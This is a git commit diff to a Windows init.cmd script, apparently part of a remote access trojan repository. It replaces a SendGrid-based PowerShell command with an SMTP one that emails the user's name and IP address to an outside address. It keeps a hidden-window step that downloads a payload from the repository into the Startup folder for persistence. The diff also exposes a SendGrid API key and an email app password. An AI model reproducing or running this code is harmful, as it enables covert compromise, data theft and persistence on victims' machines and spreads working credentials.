4fc670718d435769af050805853ecef7f6ecb510
lukeeeeeee335 <lukeeeeeee334@gmail.com>
2026-01-28 18:59:28 +0000

    smtp test5

--- init.cmd
+++ init.cmd
@@ -10,9 +10,9 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 @REM Set up SMTP
-powershell -NoProfile -Command "Invoke-RestMethod -Uri 'https://api.sendgrid.com/v3/mail/send' -Method Post -Headers @{Authorization='Bearer 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'} -ContentType 'application/json' -Body ('{""personalizations"":[{""to"":[{""email"":""fyp22356827@outlook.com""}]}],""from"":{""email"":""lukeosullivan123@gmail.com""},""subject"":""' + $env:UserName + ' logs"",""content"":[{""type"":""text/plain"",""value"":""' + ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet -ErrorAction SilentlyContinue).IPAddress -join ', ') + '""}]}')"
+powershell -NoProfile -Command "& { $email='fyp22356827@outlook.com'; $appPassword='qbpyymmalyudxsur'; $ip=(Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet -ErrorAction SilentlyContinue).IPAddress -join ', '; $subject=\"$env:UserName logs\"; $smtp=New-Object System.Net.Mail.SmtpClient('smtp.office365.com',587); $smtp.EnableSsl=$true; $smtp.UseDefaultCredentials=$false; $smtp.Credentials=New-Object System.Net.NetworkCredential($email,$appPassword); $smtp.Send($email,$email,$subject,$ip) }"
 
-pause
+
 @REM writeS payload to startup
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"
 
